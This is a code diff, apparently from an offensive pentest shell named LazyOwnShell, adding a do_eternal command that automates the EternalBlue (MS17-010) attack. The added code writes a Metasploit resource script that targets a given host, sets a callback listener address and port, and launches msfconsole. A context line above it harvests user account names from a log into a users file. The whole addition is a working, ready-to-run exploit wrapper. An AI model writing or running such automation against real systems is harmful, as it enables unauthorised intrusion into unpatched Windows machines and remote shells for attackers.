@@ -12532,6 +12532,52 @@ class LazyOwnShell(Cmd):
         os.system(f"grep \"userPrincipalName\" {log} | cut -d' ' -f2 | cut -d'@' -f1 >> sessions/users.txt")
         return
 
+    def do_eternal(self, line):
+        """
+        Automates the EternalBlue (MS17-010) exploitation process using Metasploit.
+
+        This function performs the following tasks:
+        1. Selects the EternalBlue Metasploit module for Windows SMB exploitation.
+        2. Displays the current options for the module.
+        3. Sets the required payload options, such as `LHOST` and `RHOST`.
+        4. Executes the exploit and attempts to gain access to the target machine.
+
+        :param line: Command line input that provides the LHOST and RHOST.
+        :type line: str
+        :returns: None
+        """
+
+        # Retrieve required parameters
+        rhost = self.params["rhost"]
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
+
+        if not rhost or not lhost:
+            print_warn("RHOST and LHOST must be specified.")
+            return
+
+        # Create the Metasploit resource script for EternalBlue
+        rc_file_path = "/tmp/eternalblue.rc"
+        with open(rc_file_path, "w") as file:
+            file.write(f"""
+            use exploit/windows/smb/ms17_010_eternalblue
+            set RHOSTS {rhost}
+            set LHOST {lhost}
+            set LPORT {lport}
+            run
+            """)
+
+        # Execute the Metasploit resource script
+        subprocess.run(["msfconsole", "-r", rc_file_path], check=True)
+
+        # Clean up the temporary file
+        if os.path.exists(rc_file_path):
+            os.remove(rc_file_path)
+
+        print_msg(f"Executed EternalBlue exploitation on {rhost} with listener {lhost}.")
+        return
+
+
 if __name__ == "__main__":
     p = LazyOwnShell()
     p.onecmd("p")
